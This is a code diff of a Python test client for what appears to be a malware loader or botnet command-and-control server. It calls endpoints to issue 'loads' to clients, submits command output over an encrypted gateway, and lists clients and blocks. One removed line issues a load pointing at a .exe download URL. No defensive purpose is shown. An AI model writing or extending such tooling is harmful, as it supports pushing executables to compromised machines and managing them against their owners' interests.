@@ -86,15 +86,19 @@ client_id = decrypted_response["client_id"]
 
 print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
 
+img = None
+with open("image.png", 'rb') as f:
+    img = f.read()
+
 print("[?] Issue Load")
 issue_load = requests.post(
-    SERVER_ADDRESS + "/api/issue",
+    SERVER_ADDRESS + "/api/issue_load",
     json.dumps({
         "api_secret": API_SECRET,
-        "recursive": True,
+        "is_recursive": True,
         "cmd_type": "disk",
         "required_amount": 10,
-        "cmd_args": "https://127.0.0.1:9999/files/recursive_test2.exe"
+        "cmd_args": base64.b64encode(img).decode("utf-8")
     }),
 )
 
@@ -113,10 +117,6 @@ print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
 
 if decrypted_response != "Ok":
 
-    img = None
-    with open("image.png", 'rb') as f:
-        img = f.read()
-
     print("[?] Submit Output")
     submit_output = requests.post(
         SERVER_ADDRESS + "/gateway", 
@@ -124,12 +124,11 @@ if decrypted_response != "Ok":
             "action": "submit_output",
             "client_id": client_id,
             "command_id": json.loads(decrypted_response)["command_id"],
-            "output": base64.b64encode(img).decode("utf-8")
+            "output": "Completed Succesfully"
         }), new_encryption_key)
     )
-    print(submit_output.text)
     decrypted_response = decrypt_data_withkey(submit_output.text, new_encryption_key).decode("utf-8")
-    print(f"{decrypted_response}\n{'_'*50}")
+    print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
 
 # //-------------------------------------- Server Endpoints --------------------------------------\\
 
@@ -166,6 +165,18 @@ get_clients_list = requests.post(
 )
 
 print(f"{get_clients_list.text[:500]}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+
+
+print("[?] Get blocks list")
+get_blocks_list = requests.post(
+    SERVER_ADDRESS + "/api/blocks_list",
+    json.dumps({
+        "api_secret": API_SECRET,
+    }),
+)
+
+print(get_blocks_list.status_code)
+print(f"{get_blocks_list.text[:500]}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
 
 '''
 print("[?] Delete load")
